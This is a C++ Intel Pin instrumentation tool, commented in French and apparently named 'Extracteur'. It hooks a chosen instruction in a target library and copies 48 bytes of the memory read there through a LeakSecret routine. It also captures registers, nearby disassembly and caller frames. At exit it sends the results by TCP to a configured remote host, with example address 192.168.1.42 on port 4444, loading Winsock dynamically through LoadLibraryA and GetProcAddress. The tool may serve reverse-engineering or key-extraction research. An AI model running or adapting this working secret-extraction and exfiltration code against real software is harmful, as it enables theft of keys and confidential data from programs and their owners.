/**
 * @file Extracteur.cpp
 * @brief Outil PIN pour capturer une backtrace au point d'une instruction cible
 *        et envoyer les données via TCP à un serveur distant.
 *
 * Fonctionne de manière identique à Backtracer.cpp, mais au lieu d'écrire
 * les résultats dans « data/log/Backtrace.log », les envoie via une connexion
 * TCP à un serveur distant dont l'adresse IP, le port et les options sont
 * définis dans la section [NETWORK] du fichier de configuration PIN.
 *
 * Section [NETWORK] attendue dans pin_config.ini :
 *   [NETWORK]
 *   HOST     = 192.168.1.42
 *   PORT     = 4444
 *   TIMEOUT  = 5          ; secondes (optionnel, défaut : 5)
 *   FALLBACK = 1          ; 0 ou 1 – écrire quand même dans le fichier si envoi échoue
 *
 * NOTE TECHNIQUE – Winsock sans windows.h :
 *   Inclure <winsock2.h> ou <windows.h> avant pin.H provoque des conflits de
 *   macros irrécupérables (REG_NONE, BOOL, gethostname…). On résout donc
 *   ws2_32.dll entièrement par LoadLibraryA / GetProcAddress, déclarés extern "C"
 *   sans aucun include Windows supplémentaire (kernel32.lib est déjà dans $libs).
 */

#include <atomic>
#include <cctype>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <map>
#include <sstream>
#include <string>
#include <vector>
#include <cstdlib> // Pour atoi ou strtol

// pin.H doit être inclus en premier — aucun include Windows avant lui.
#include "pin.H"

//------------------------------------------------------------------------------
// Config KNOB
//------------------------------------------------------------------------------
KNOB<std::string> KnobConfigFile(KNOB_MODE_WRITEONCE, "pintool",
                                 "config", "pin_config.ini",
                                 "Path to the PIN tool configuration file");

//------------------------------------------------------------------------------
// Filtering globals
//------------------------------------------------------------------------------
static std::vector<std::string> skip_libs;
static std::vector<std::string> target_libs;
static std::string filter_mode = "blacklist";

//------------------------------------------------------------------------------
// Network globals
//------------------------------------------------------------------------------
static std::string  net_host     = "";
static int          net_port     = 4444;
static int          net_timeout  = 5;
static bool         net_fallback = true;

//------------------------------------------------------------------------------
// Winsock types / constantes définis localement (sans winsock2.h)
//------------------------------------------------------------------------------
typedef unsigned int   EX_SOCKET;
typedef unsigned short EX_USHORT;

static const EX_SOCKET EX_INVALID_SOCKET = (EX_SOCKET)(~0);
static const int        EX_SOCKET_ERROR   = -1;
static const int        EX_AF_INET        = 2;
static const int        EX_SOCK_STREAM    = 1;
static const int        EX_IPPROTO_TCP    = 6;
static const int        EX_SOL_SOCKET     = 0xffff;
static const int        EX_SO_SNDTIMEO    = 0x1005;
static const int        EX_SO_RCVTIMEO    = 0x1006;

#pragma pack(push, 1)
struct EX_WSADATA { char pad[408]; };
struct EX_SOCKADDR_IN {
    short         sin_family;
    EX_USHORT     sin_port;
    unsigned char sin_addr[4];
    char          sin_zero[8];
};
struct EX_ADDRINFOA {
    int              ai_flags;
    int              ai_family;
    int              ai_socktype;
    int              ai_protocol;
    size_t           ai_addrlen;
    char            *ai_canonname;
    EX_SOCKADDR_IN  *ai_addr;
    EX_ADDRINFOA    *ai_next;
};
#pragma pack(pop)

typedef int         (__stdcall *FN_WSAStartup)    (unsigned short, EX_WSADATA *);
typedef int         (__stdcall *FN_WSACleanup)    ();
typedef int         (__stdcall *FN_WSAGetLastError)();
typedef EX_SOCKET   (__stdcall *FN_socket)        (int, int, int);
typedef int         (__stdcall *FN_connect)       (EX_SOCKET, const EX_SOCKADDR_IN *, int);
typedef int         (__stdcall *FN_send)          (EX_SOCKET, const char *, int, int);
typedef int         (__stdcall *FN_closesocket)   (EX_SOCKET);
typedef int         (__stdcall *FN_setsockopt)    (EX_SOCKET, int, int, const char *, int);
typedef unsigned long (__stdcall *FN_inet_addr)   (const char *);
typedef EX_USHORT   (__stdcall *FN_htons)         (EX_USHORT);
typedef int         (__stdcall *FN_getaddrinfo)   (const char *, const char *,
                                                   const EX_ADDRINFOA *, EX_ADDRINFOA **);
typedef void        (__stdcall *FN_freeaddrinfo)  (EX_ADDRINFOA *);

static FN_WSAStartup     p_WSAStartup     = nullptr;
static FN_WSACleanup     p_WSACleanup     = nullptr;
static FN_WSAGetLastError p_WSAGetLastError = nullptr;
static FN_socket         p_socket         = nullptr;
static FN_connect        p_connect        = nullptr;
static FN_send           p_send           = nullptr;
static FN_closesocket    p_closesocket    = nullptr;
static FN_setsockopt     p_setsockopt     = nullptr;
static FN_inet_addr      p_inet_addr      = nullptr;
static FN_htons          p_htons          = nullptr;
static FN_getaddrinfo    p_getaddrinfo    = nullptr;
static FN_freeaddrinfo   p_freeaddrinfo   = nullptr;

static bool g_winsock_loaded = false;

// LoadLibraryA et GetProcAddress viennent de kernel32.lib (déjà dans $libs du build).
// On les déclare extern "C" sans inclure windows.h pour éviter les conflits avec PIN.
extern "C" void * __stdcall LoadLibraryA(const char *);
extern "C" void * __stdcall GetProcAddress(void *, const char *);

static bool load_winsock()
{
    if (g_winsock_loaded) return true;

    void *hWs2 = LoadLibraryA("ws2_32.dll");
    if (!hWs2) { return false; }

#define RESOLVE(name) \
    p_##name = (FN_##name)GetProcAddress(hWs2, #name); \
    if (!p_##name) { return false; }

    RESOLVE(WSAStartup)
    RESOLVE(WSACleanup)
    RESOLVE(WSAGetLastError)
    RESOLVE(socket)
    RESOLVE(connect)
    RESOLVE(send)
    RESOLVE(closesocket)
    RESOLVE(setsockopt)
    RESOLVE(inet_addr)
    RESOLVE(htons)
    RESOLVE(getaddrinfo)
    RESOLVE(freeaddrinfo)
#undef RESOLVE

    EX_WSADATA wsa;
    if (p_WSAStartup(0x0202, &wsa) != 0)
    { return false; }

    g_winsock_loaded = true;
    return true;
}

//------------------------------------------------------------------------------
// Helpers
//------------------------------------------------------------------------------
static std::string ex_trim(const std::string &s)
{
    const auto start = s.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return {};
    const auto end = s.find_last_not_of(" \t\r\n");
    return s.substr(start, end - start + 1);
}

static std::string ex_get_filename(const std::string &path)
{
    auto pos = path.find_last_of("\\/");
    std::string f = (pos == std::string::npos) ? path : path.substr(pos + 1);
    for (auto &c : f) c = std::tolower(c);
    return f;
}

//------------------------------------------------------------------------------
// Config loader
//------------------------------------------------------------------------------
static std::string libName;

static void load_config(const std::string &filename)
{
    std::ifstream cfg(filename);
    if (!cfg) { return; }

    std::string line, section;
    while (std::getline(cfg, line))
    {
        auto p = line.find('#');
        if (p != std::string::npos) line = line.substr(0, p);
        line = ex_trim(line);
        if (line.empty()) continue;
        if (line.front() == '[' && line.back() == ']') { section = line; continue; }
        auto eq = line.find('=');
        if (eq == std::string::npos) continue;
        std::string key = ex_trim(line.substr(0, eq));
        std::string val = ex_trim(line.substr(eq + 1));

        if (section == "[FILTERS]")
        {
            if (key == "MODE")
            {
                for (auto &c : val) c = std::tolower(c);
                if (val == "whitelist" || val == "blacklist" || val == "none") filter_mode = val;
            }
            else if (key == "FILTER_LIB")
            {
                std::istringstream ss(val); std::string lib;
                while (std::getline(ss, lib, ',')) skip_libs.push_back(ex_trim(lib));
            }
            else if (key == "TARGET_LIB")
            {
                std::istringstream ss(val); std::string lib;
                while (std::getline(ss, lib, ',')) target_libs.push_back(ex_trim(lib));
            }
        }
        else if (section == "[NETWORK]")
        {
            if (key == "HOST") {
                net_host = val;
            }
            else if (key == "PORT") {
                // atoi est sûr ici car si val n'est pas un nombre, il renvoie 0
                // ce qui évite de casser la compilation et les exceptions.
                int port = std::atoi(val.c_str());
                if (port != 0 || val == "0") net_port = port;
            }
            else if (key == "TIMEOUT") {
                int timeout = std::atoi(val.c_str());
                if (timeout != 0 || val == "0") net_timeout = timeout;
            }
            else if (key == "FALLBACK") {
                net_fallback = (val != "0");
            }
        }
    }

}

static bool should_skip_img(const std::string &imgName)
{
    std::string fname = ex_get_filename(imgName);
    std::string target_fname = ex_get_filename(libName);
    if (!target_fname.empty() && fname.find(target_fname) != std::string::npos) return false;
    if (filter_mode == "whitelist")
    {
        for (auto &t : target_libs) { std::string tl=t; for(auto &c:tl)c=std::tolower(c); if(fname==tl||fname.find(tl)!=std::string::npos)return false; }
        return true;
    }
    if (filter_mode == "blacklist")
        for (auto &s : skip_libs) { std::string sl=s; for(auto &c:sl)c=std::tolower(c); if(fname==sl||fname.find(sl)!=std::string::npos)return true; }
    return false;
}

//------------------------------------------------------------------------------
// Network: envoi TCP
//------------------------------------------------------------------------------
static bool send_tcp(const std::string &payload)
{
    if (net_host.empty()) { return false; }
    if (!load_winsock()) return false;

    EX_SOCKET sock = p_socket(EX_AF_INET, EX_SOCK_STREAM, EX_IPPROTO_TCP);
    if (sock == EX_INVALID_SOCKET) { return false; }

    unsigned long timeout_ms = (unsigned long)(net_timeout * 1000);
    p_setsockopt(sock, EX_SOL_SOCKET, EX_SO_SNDTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));
    p_setsockopt(sock, EX_SOL_SOCKET, EX_SO_RCVTIMEO, (const char *)&timeout_ms, sizeof(timeout_ms));

    EX_SOCKADDR_IN server = {};
    server.sin_family = (short)EX_AF_INET;
    server.sin_port   = p_htons((EX_USHORT)net_port);

    unsigned long addr = p_inet_addr(net_host.c_str());
    if (addr == 0xFFFFFFFF) // INADDR_NONE – tentative DNS
    {
        EX_ADDRINFOA hints = {}, *res = nullptr;
        hints.ai_family   = EX_AF_INET;
        hints.ai_socktype = EX_SOCK_STREAM;
        if (p_getaddrinfo(net_host.c_str(), nullptr, &hints, &res) != 0 || !res)
        {
            p_closesocket(sock); return false;
        }
        const unsigned char *src = res->ai_addr->sin_addr;
        server.sin_addr[0]=src[0]; server.sin_addr[1]=src[1];
        server.sin_addr[2]=src[2]; server.sin_addr[3]=src[3];
        p_freeaddrinfo(res);
    }
    else
    {
        server.sin_addr[0]=(addr>> 0)&0xFF; server.sin_addr[1]=(addr>> 8)&0xFF;
        server.sin_addr[2]=(addr>>16)&0xFF; server.sin_addr[3]=(addr>>24)&0xFF;
    }

    if (p_connect(sock, &server, sizeof(server)) == EX_SOCKET_ERROR)
    {
        p_closesocket(sock); return false;
    }

    const char *ptr = payload.c_str();
    int remaining   = (int)payload.size();
    bool ok = true;
    while (remaining > 0)
    {
        int sent = p_send(sock, ptr, remaining, 0);
        if (sent == EX_SOCKET_ERROR) { ok=false; break; }
        ptr += sent; remaining -= sent;
    }

    p_closesocket(sock);
    return ok;
}

//------------------------------------------------------------------------------
// State globals
//------------------------------------------------------------------------------
static std::stringstream key_out;
static std::stringstream log_out;
static std::string funName;
static std::string insName;
static ADDRINT     insAddress          = 0;
static ADDRINT     delta               = 0;
static bool        targetImageResolved = false;
static std::atomic<bool> logged{false};
static PIN_LOCK ioLock;
static const ADDRINT RANGE_BEFORE = 0x80;
static const ADDRINT RANGE_AFTER  = 0x20;
static std::vector<char *> gInstList;
static const int SECRET_LEN = 48;
static std::vector<uint8_t> gLeakedBytes;

//------------------------------------------------------------------------------
// Lecture du fichier d'analyse
//------------------------------------------------------------------------------
void LoadResultAnalyse(const std::string &filename)
{
    std::ifstream file(filename);
    if (!file.is_open()) { log_out << "ERROR: Impossible d'ouvrir " << filename << "\n"; return; }
    std::map<std::string, std::string> kv;
    std::string line;
    while (std::getline(file, line))
    {
        auto pos = line.find(':');
        if (pos == std::string::npos) continue;
        std::string key = line.substr(0, pos);
        std::string val = line.substr(pos + 1);
        val.erase(0, val.find_first_not_of(" \t"));
        kv[key] = val;
    }
    libName = kv["Librairie"]; funName = kv["Fonction"]; insName = kv["Instruction"];
    if (kv.count("Delta"))   delta      = std::stoull(kv["Delta"],   nullptr, 10);
    else log_out << "ERROR: 'Delta' key not found\n";
    if (kv.count("Adresse")) insAddress = std::stoull(kv["Adresse"], nullptr, 16);
    else log_out << "ERROR: 'Adresse' key not found\n";
    log_out << "libName=" << libName << " delta=" << delta
            << " insAddress=0x" << std::hex << insAddress << std::dec
            << " funName=" << funName << " insName=" << insName << "\n";
    file.close();
}

//------------------------------------------------------------------------------
// Callbacks PIN
//------------------------------------------------------------------------------
VOID ImageLoad(IMG img, VOID *)
{
    const std::string imgName = IMG_Name(img);
    if (imgName.find(libName) != std::string::npos)
    {
        if (targetImageResolved) { log_out << "Duplicate target image ignored: " << imgName << "\n"; return; }
        insAddress = IMG_LowAddress(img) + delta;
        log_out << "Librairie chargée: " << imgName << "\n"
                << "Adresse de base: 0x" << std::hex << IMG_LowAddress(img) << "\n"
                << "Adresse cible: 0x"   << std::hex << insAddress << std::dec << "\n";
        targetImageResolved = true;
    }
}

VOID LeakSecret(void *ea, THREADID tid)
{
    uint8_t buffer[SECRET_LEN];
    log_out << "DEBUG: Address effective: 0x" << std::hex << reinterpret_cast<ADDRINT>(ea) << std::dec << "\n";
    UINT32 copied = PIN_SafeCopy(buffer, ea, SECRET_LEN);
    if (copied == SECRET_LEN)
    {
        gLeakedBytes.insert(gLeakedBytes.end(), buffer, buffer + SECRET_LEN);
        log_out << "DEBUG: Leaked bytes: ";
        for (int i = 0; i < SECRET_LEN; i++) log_out << std::hex << std::setw(2) << std::setfill('0') << (int)buffer[i] << " ";
        log_out << "\n";
    }
    else
    {
        log_out << "ERROR: PIN_SafeCopy failed. Copied: " << copied << "\n";
        memset(buffer, 0, SECRET_LEN);
        gLeakedBytes.insert(gLeakedBytes.end(), buffer, buffer + SECRET_LEN);
    }
}

VOID Backtrace(ADDRINT ip, THREADID tid, std::vector<char *> *instList, const CONTEXT *ctx)
{
    bool expected = false;
    if (!logged.compare_exchange_strong(expected, true))
    { for (auto p : *instList) free(p); instList->clear(); return; }

    PIN_GetLock(&ioLock, 1);

    ADDRINT rdi = PIN_GetContextReg(ctx, LEVEL_BASE::REG_RDI);
    ADDRINT rsi = PIN_GetContextReg(ctx, LEVEL_BASE::REG_RSI);
    ADDRINT rdx = PIN_GetContextReg(ctx, LEVEL_BASE::REG_RDX);
    ADDRINT rcx = PIN_GetContextReg(ctx, LEVEL_BASE::REG_RCX);
    ADDRINT r8  = PIN_GetContextReg(ctx, LEVEL_BASE::REG_R8);
    ADDRINT r9  = PIN_GetContextReg(ctx, LEVEL_BASE::REG_R9);
    ADDRINT rsp = PIN_GetContextReg(ctx, LEVEL_BASE::REG_RSP);

    PIN_LockClient();
    RTN rtn_cur = RTN_FindByAddress(ip);
    std::string currentFunc = RTN_Valid(rtn_cur) ? RTN_Name(rtn_cur) : "<unknown>";
    PIN_UnlockClient();

    std::ostringstream oss;
    oss << std::hex << std::setfill('0')
        << "Adresse : 0x"  << std::setw(16) << ip << "\n"
        << "Fonction : `"  << currentFunc << "`\n"
        << "=== Registres au point cible ===\n"
        << "\tRDI = 0x" << std::setw(16) << rdi << "\n"
        << "\tRSI = 0x" << std::setw(16) << rsi << "\n"
        << "\tRDX = 0x" << std::setw(16) << rdx << "\n"
        << "\tRCX = 0x" << std::setw(16) << rcx << "\n"
        << "\tR8  = 0x" << std::setw(16) << r8  << "\n"
        << "\tR9  = 0x" << std::setw(16) << r9  << "\n"
        << "===     Fuite    ===\n";
    for (auto b : gLeakedBytes) oss << std::hex << std::setw(2) << std::setfill('0') << uint32_t(b);
    oss << std::dec << "\n=== Instructions ===\n";
    for (auto disasm_cstr : *instList)
        oss << (disasm_cstr == insName ? "[!] " : "\t") << disasm_cstr << "\n";

    oss << "=== Appelant(s) (stack walk) ===\n";
    PIN_LockClient();
    int frames = 0;
    for (ADDRINT offset = 0; offset < 4096 && frames < 32; offset += 8)
    {
        ADDRINT candidate = 0;
        if (PIN_SafeCopy(&candidate, reinterpret_cast<void *>(rsp + offset), 8) != 8) break;
        if (!candidate) continue;
        IMG img = IMG_FindByAddress(candidate);
        if (!IMG_Valid(img)) continue;
        RTN frame_rtn = RTN_FindByAddress(candidate);
        oss << "  [" << std::dec << frames++ << "] "
            << (RTN_Valid(frame_rtn) ? RTN_Name(frame_rtn) : "<unknown>")
            << " @ 0x" << std::hex << std::setw(16) << std::setfill('0') << candidate
            << "\n\t" << IMG_Name(img) << "\n";
    }
    if (frames == 0) oss << "  (aucun appelant trouve dans la fenetre de stack)\n";
    PIN_UnlockClient();

    key_out << oss.str();
    PIN_ReleaseLock(&ioLock);
    for (auto p : *instList) free(p);
    instList->clear();
}

VOID Instruction(INS ins, VOID *)
{
    ADDRINT addr = INS_Address(ins);
    if (addr == insAddress && gLeakedBytes.size() < (size_t)SECRET_LEN)
        INS_InsertPredicatedCall(ins, IPOINT_BEFORE, AFUNPTR(LeakSecret),
                                 IARG_MEMORYREAD_EA, IARG_THREAD_ID, IARG_END);
    if (insAddress > 0 && addr >= insAddress - RANGE_BEFORE && addr <= insAddress + RANGE_AFTER)
    {
        char *disasm_cstr = strdup(INS_Disassemble(ins).c_str());
        gInstList.push_back(disasm_cstr);
        if (addr == insAddress)
            INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)Backtrace,
                           IARG_INST_PTR, IARG_THREAD_ID,
                           IARG_PTR, &gInstList,
                           IARG_CONST_CONTEXT, IARG_END);
    }
}

//------------------------------------------------------------------------------
// Fini
//------------------------------------------------------------------------------
VOID Fini(INT32 code, VOID *v)
{
    const std::string backtrace_payload = key_out.str();
    const std::string debug_payload     = log_out.str();

    bool sent = send_tcp(debug_payload);

    if (!sent && net_fallback)
    {
        std::ofstream file("data/log/Backtrace.log", std::ios::out | std::ios::trunc);
        if (file.is_open()) { file << backtrace_payload; file.close(); }
    }

    std::ofstream output("data/log/extracteur_leaks.log", std::ios::out | std::ios::trunc);
    if (output.is_open()) { output << debug_payload; output.close(); }

    if (g_winsock_loaded) p_WSACleanup();
}

//------------------------------------------------------------------------------
// Point d'entrée
//------------------------------------------------------------------------------
int main(int argc, char *argv[])
{
    PIN_InitSymbols();
    if (PIN_Init(argc, argv)) return -1;
    PIN_InitLock(&ioLock);
    LoadResultAnalyse("data/log/getName.log");
    load_config(KnobConfigFile.Value());
    INS_AddInstrumentFunction(Instruction, 0);
    IMG_AddInstrumentFunction(ImageLoad, 0);
    PIN_AddFiniFunction(Fini, 0);
    PIN_StartProgram();
    return 0;
}
